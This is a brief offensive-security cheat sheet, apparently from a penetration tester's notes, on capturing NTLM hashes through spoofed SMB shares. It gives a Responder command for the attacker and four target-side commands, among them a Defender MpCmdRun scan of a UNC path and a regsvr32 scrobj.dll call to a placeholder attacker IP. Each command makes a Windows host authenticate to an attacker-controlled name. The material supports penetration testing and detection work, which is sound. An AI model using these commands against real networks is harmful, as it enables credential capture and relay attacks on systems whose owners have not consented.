# 01 - Capture Hashes via Spoof SMB Shares

Search Tag(s): #mitm #responder #smb #relay #ntlm #scenarios

## 1.1 - Attacker

`$ sudo responder -I <interface> -rdwv`

## 1.2 - Target

```
C:\> net view \\snare

C:\> MpCmdRun.exe -Scan -ScanType 3 -File \\snare\share\file.txt

PS C:\> Resolve-DnsName -LlmnrOnly Snare 2> $Null

C:\> regsvr32.exe /s /u /i://<attacker_IP>/@snare scrobj.dll
```